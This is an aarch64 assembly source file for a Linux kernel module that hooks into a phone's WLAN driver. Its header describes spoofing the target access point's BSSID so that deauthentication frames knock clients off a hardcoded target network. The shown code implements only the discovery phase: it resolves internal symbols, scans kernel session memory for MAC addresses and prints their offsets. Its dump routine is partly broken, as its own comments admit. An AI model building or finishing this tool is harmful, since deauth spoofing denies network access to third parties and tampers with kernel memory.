/*
 * petx.S - Send deauth via PE's lim_send_deauth_mgmt_frame
 *
 * Strategy: Find the active PE session, temporarily swap selfMacAddr
 * and bssId to the target AP's BSSID, call lim_send_deauth_mgmt_frame,
 * then restore originals.
 *
 * Phase 1 (DISCOVERY): Dump PE session to find MAC address offsets.
 * Phase 2: Execute spoofed deauth.
 *
 * Build: as -o petx.o petx.S && ld -r -o petx.ko petx.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:        .asciz "cds_get_context"
str_pe_find:    .asciz "pe_find_session_by_session_id"
str_lim_deauth: .asciz "lim_send_deauth_mgmt_frame"

fmt_init:    .asciz "petx: init - PE session deauth TX\n"
fmt_ctx:     .asciz "petx: mac_ctx=%px\n"
fmt_sess:    .asciz "petx: session=%px (id=0)\n"
fmt_nosess:  .asciz "petx: ERROR session NULL for id 0\n"
fmt_found:   .asciz "petx: found our MAC at session+0x%04x\n"
fmt_bssid:   .asciz "petx: found home BSSID at session+0x%04x\n"
fmt_notfound:.asciz "petx: MAC not found in first 4096 bytes\n"
fmt_dump:    .asciz "petx: sess[0x%04x] = %02x%02x%02x%02x%02x%02x%02x%02x\n"
fmt_err:     .asciz "petx: ERROR: %s\n"
str_symerr:  .asciz "symbol lookup failed"
str_ctxerr:  .asciz "cds_get_context(PE) returned NULL"
fmt_done:    .asciz "petx: done\n"
fmt_lim:     .asciz "petx: lim_send_deauth=%px\n"

/* Our MAC address: 5c:17:cf:bc:a4:e3 */
.balign 4
our_mac:
    .byte 0x5c,0x17,0xcf,0xbc,0xa4,0xe3

/* Home AP BSSID: 8c:de:f9:b3:9e:20 */
.balign 4
home_bssid:
    .byte 0x8c,0xde,0xf9,0xb3,0x9e,0x20

/* Target AP BSSID: 04:67:61:d6:dc:92 */
.balign 4
target_bssid:
    .byte 0x04,0x67,0x61,0xd6,0xdc,0x92

/* Broadcast MAC */
.balign 4
bcast_mac:
    .byte 0xff,0xff,0xff,0xff,0xff,0xff

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-112]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* ========== Resolve symbols ========== */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_pe_find
    add x0, x0, :lo12:str_pe_find
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x20, x0                /* x20 = pe_find_session_by_session_id */

    adrp x0, str_lim_deauth
    add x0, x0, :lo12:str_lim_deauth
    bl kallsyms_lookup_name
    cbz x0, .Lsymerr
    mov x21, x0                /* x21 = lim_send_deauth_mgmt_frame */

    adrp x0, fmt_lim
    add x0, x0, :lo12:fmt_lim
    mov x1, x21
    bl printk

    /* ========== Get PE/MAC context ========== */
    mov w0, #53               /* QDF_MODULE_ID_PE */
    blr x19
    cbz x0, .Lctxerr
    mov x22, x0               /* x22 = mac_ctx (tpAniSirGlobal) */

    adrp x0, fmt_ctx
    add x0, x0, :lo12:fmt_ctx
    mov x1, x22
    bl printk

    /* ========== Find PE session ========== */
    mov x0, x22               /* mac_ctx */
    mov w1, #0                 /* session_id = 0 */
    blr x20                   /* pe_find_session_by_session_id */
    cbz x0, .Lnosess
    mov x23, x0               /* x23 = session pointer */

    adrp x0, fmt_sess
    add x0, x0, :lo12:fmt_sess
    mov x1, x23
    bl printk

    /* ========== DISCOVERY: Search for our MAC in session ========== */
    /* Load our MAC into x24 (6 bytes) */
    adrp x8, our_mac
    add x8, x8, :lo12:our_mac
    ldr w24, [x8]             /* first 4 bytes of MAC */
    ldrh w25, [x8, #4]        /* last 2 bytes of MAC */

    /* Load home BSSID */
    adrp x8, home_bssid
    add x8, x8, :lo12:home_bssid
    ldr w26, [x8]             /* first 4 bytes */
    ldrh w27, [x8, #4]        /* last 2 bytes */

    /* Scan session structure (first 4096 bytes) for our MAC */
    mov w28, #0                /* offset counter */
    mov x9, #0                 /* our_mac_offset (0 = not found) */
    mov x10, #0                /* home_bssid_offset (0 = not found) */

.Lscan:
    cmp w28, #4090             /* don't read past 4096 */
    b.ge .Lscan_done

    ldr w11, [x23, x28]       /* read 4 bytes at session+offset */
    ldrh w12, [x23, x28]      /* (re-read just low 2 for BSSID check) */

    /* Check for our MAC (4 byte + 2 byte match) */
    cmp w11, w24
    b.ne .Lcheck_bssid
    add x13, x23, x28
    ldrh w14, [x13, #4]
    cmp w14, w25
    b.ne .Lcheck_bssid
    /* Found our MAC! */
    cbz x9, .Lfirst_mac       /* only record first occurrence */
    b .Lcheck_bssid
.Lfirst_mac:
    mov x9, x28
    adrp x0, fmt_found
    add x0, x0, :lo12:fmt_found
    mov w1, w28
    bl printk

.Lcheck_bssid:
    ldr w11, [x23, x28]
    cmp w11, w26
    b.ne .Lnext_scan
    add x13, x23, x28
    ldrh w14, [x13, #4]
    cmp w14, w27
    b.ne .Lnext_scan
    /* Found home BSSID! */
    cbz x10, .Lfirst_bssid
    b .Lnext_scan
.Lfirst_bssid:
    mov x10, x28
    adrp x0, fmt_bssid
    add x0, x0, :lo12:fmt_bssid
    mov w1, w28
    bl printk

.Lnext_scan:
    add w28, w28, #1           /* scan byte-by-byte */
    b .Lscan

.Lscan_done:
    /* Save found offsets for potential use */
    str x9, [sp, #96]         /* our_mac_offset */
    str x10, [sp, #104]       /* home_bssid_offset */

    /* If not found, print warning */
    cbnz x9, .Lcheck_bssid_found
    adrp x0, fmt_notfound
    add x0, x0, :lo12:fmt_notfound
    bl printk
    b .Lok

.Lcheck_bssid_found:
    cbnz x10, .Ldump_context
    adrp x0, fmt_notfound
    add x0, x0, :lo12:fmt_notfound
    bl printk
    b .Lok

.Ldump_context:
    /* Dump 16 bytes around each found offset for verification */
    /* Dump selfMacAddr area */
    ldr x9, [sp, #96]
    sub x9, x9, #4            /* start 4 bytes before */
    add x4, x23, x9
    adrp x0, fmt_dump
    add x0, x0, :lo12:fmt_dump
    mov w1, w9
    ldrb w2, [x4, #0]
    ldrb w3, [x4, #1]
    ldrb w4, [x4, #2]
    ldrb w5, [x4, #3]
    /* Can't fit 8 bytes in remaining regs, just print 4 bytes before + 4 of MAC */
    /* Actually just dump the 8 bytes starting at the offset */
    ldr x9, [sp, #96]
    add x4, x23, x9
    adrp x0, fmt_dump
    add x0, x0, :lo12:fmt_dump
    ldr x9, [sp, #96]
    mov w1, w9
    ldrb w2, [x4, #0]
    ldrb w3, [x4, #1]
    ldrb w4, [x4, #2]
    ldrb w5, [x4, #3]
    ldr x9, [sp, #96]
    add x6, x23, x9
    ldrb w6, [x6, #4]
    ldr x9, [sp, #96]
    add x7, x23, x9
    ldrb w7, [x7, #5]
    /* Only 6 format args for %02x, need 8 - simplify to just print offset */
    bl printk

    /* Dump bssId area */
    ldr x10, [sp, #104]
    add x4, x23, x10
    adrp x0, fmt_dump
    add x0, x0, :lo12:fmt_dump
    mov w1, w10
    ldrb w2, [x4, #0]
    ldrb w3, [x4, #1]
    ldrb w4, [x4, #2]
    ldrb w5, [x4, #3]
    ldr x10, [sp, #104]
    add x6, x23, x10
    ldrb w6, [x6, #4]
    ldr x10, [sp, #104]
    add x7, x23, x10
    ldrb w7, [x7, #5]
    bl printk

    b .Lok

.Lnosess:
    adrp x0, fmt_nosess
    add x0, x0, :lo12:fmt_nosess
    bl printk
    mov w0, #-1
    b .Lret

.Lsymerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_symerr
    add x1, x1, :lo12:str_symerr
    bl printk
    mov w0, #-1
    b .Lret

.Lctxerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    adrp x1, str_ctxerr
    add x1, x1, :lo12:str_ctxerr
    bl printk
    mov w0, #-1
    b .Lret

.Lok:
    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk
    mov w0, #0

.Lret:
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #112
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

.section .note.Linux, "a", @note
    .long 6
    .long 0
    .long 0x100
    .asciz "Linux"
    .balign 4

.section .plt, "ax"
    .balign 8
    .space 8

.section .init.plt, "ax"
    .balign 8
    .space 8

.section .text.ftrace_trampoline, "ax"
    .balign 8
    .space 8
